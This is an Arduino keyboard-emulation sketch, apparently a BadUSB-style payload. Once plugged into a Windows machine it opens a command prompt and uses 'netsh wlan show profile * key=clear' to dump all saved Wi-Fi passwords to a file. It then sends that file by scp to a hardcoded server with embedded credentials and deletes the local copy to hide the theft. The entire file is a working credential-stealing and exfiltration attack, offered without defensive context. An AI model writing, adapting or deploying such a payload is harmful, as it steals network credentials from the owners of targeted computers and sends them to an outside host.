#include <Keyboard.h>

// set variables for server connection
const char* server_user = "ubuntu";
const char* server_password = "ubuntu";
const char* server_path = "/home/ubuntu";
const char* server_ip = "192.168.8.124";

void setup() {

  Keyboard.begin(); //start keyboard communication 
   delay(600);
   Keyboard.press(KEY_LEFT_GUI);
   delay(600); 
   Keyboard.press('r');
   delay(600); 
   Keyboard.release(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(600); 
   Keyboard.release(KEY_LEFT_GUI);
   delay(600);
   Keyboard.press('c');
   delay(600);
   Keyboard.press('m');
   delay(600);
   Keyboard.press('d');
   delay(600);
   Keyboard.release('c');
   delay(600);
   Keyboard.release('m');
   delay(600);
   Keyboard.release('d');
   delay(600);
   Keyboard.press(KEY_RETURN);
   delay(600);
   Keyboard.release(KEY_RETURN);
   Keyboard.release('r');
   delay(600); 
   Keyboard.println("netsh wlan show profile * key=clear > data.txt");
   delay(600);
   String copyCommand = "scp data.txt" + String(server_user) + "@" + String(server_ip) + ":" + String(server_path);
   Keyboard.println(copyCommand);
   delay(600);
   Keyboard.println("del /f data.txt");
   delay(600);
   Keyboard.press(KEY_RETURN);
   delay(600);
   Keyboard.release(KEY_RETURN);
   Keyboard.end();
 }

void loop() {}
